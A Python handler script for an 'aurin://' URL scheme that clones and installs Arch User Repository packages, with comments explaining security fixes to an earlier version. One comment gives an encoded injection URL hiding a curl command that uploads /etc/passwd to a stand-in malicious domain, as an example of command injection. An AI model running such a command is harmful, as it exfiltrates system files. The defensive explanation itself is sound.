import os
import shutil
import subprocess
import sys
from pathlib import Path

URL_PREFIX = "aurin://"
ILLEGAL_PKG_NAME_CONTENTS = (".", "..", "/")

temp_dir = Path("/var", "tmp", "aurin")


def error_out(message: str):
    print(f"ERROR: {message}", file=sys.stderr)
    sys.exit(1)


def notify(icon: str, title: str, message: str):
    # Respect the user's settings by querying the variable that is already set.
    # If not, use the value computed by the script
    xdg_runtime_dir = os.environ.get("XDG_RUNTIME_DIR", f"/run/user/{os.getuid()}")

    # The original script uses os.system in conjunction with untrusted/user input.
    # NEVER, EVER EVER EVER DO THAT. This is how RCE vulnerabilities are made!
    # A malicious user could compromise the machine by hiding commands in an invisible link element
    # For example:
    # aurin://%3B%20curl%20-d%20%40%2Fetc%2Fpasswd%20http%3A%2F%2Fmalicious_domain.example.com%3B%20
    # In this case `; curl -d @/etc/passwd http://malicious_domain.example.com; ` is hidden in the URL
    # This transparently uploads /etc/passwd to a malicious domain without the user's knowledge.
    subprocess.check_call(
        [
            "notify-send",
            "-i", icon,
            title,
            message
        ],
        env={
            "XDG_RUNTIME_DIR": xdg_runtime_dir
        }
    )


# Bail out when an invalid number of arguments has been given, a program that fetches remote content
# should never download remote resources that can change without the user's consent
if len(sys.argv) < 1:
    error_out(f"Invalid number of arguments, you must provide a package name")

input_pkg_name = sys.argv[1]

# Only accept input values that are an actual valid URI
if not input_pkg_name.startswith(URL_PREFIX):
    error_out(f"Input URL {input_pkg_name} does not start with {URL_PREFIX}")

# Use slicing to extract the package name.
# The original script uses str.replace which might have some nasty side effects.
pkg_name = input_pkg_name[len(URL_PREFIX):]

# Deny certain characters to avoid path pollution that can enable path traversal and such.
for thing in ILLEGAL_PKG_NAME_CONTENTS:
    if thing in pkg_name:
        error_out(f"Illegal character pattern {thing} in package name {pkg_name}")

# Make sure the temporary directory for aurin always exists
temp_dir.mkdir(parents=True, exist_ok=True)
build_root = temp_dir / pkg_name

# Use check_call instead of run. You do not want to continue running this script when the call
# to `git clone` fails. `check_call` will throw `CalledProcessError` when the command given to it
# fails
subprocess.check_call([
    "git", "clone",
    f"https://aur.archlinux.org/{pkg_name}.git",
    str(build_root)
])

subprocess.check_call(
    [
        "bash",
        "/opt/aurin/installpkg.sh",
        str(build_root)
    ],
    cwd=build_root
)

# Make sure we're not in the directory that's about to be removed
os.chdir(os.environ.get("HOME", "/"))

# This was originally handled in installpkg.sh with `rm -rf "$1"`.
# Just a warning that this can be an enormous footgun
shutil.rmtree(build_root, ignore_errors=True)

notify("/opt/aurin/aurin48.png", "Install Successful", f"{pkg_name} has been installed!")
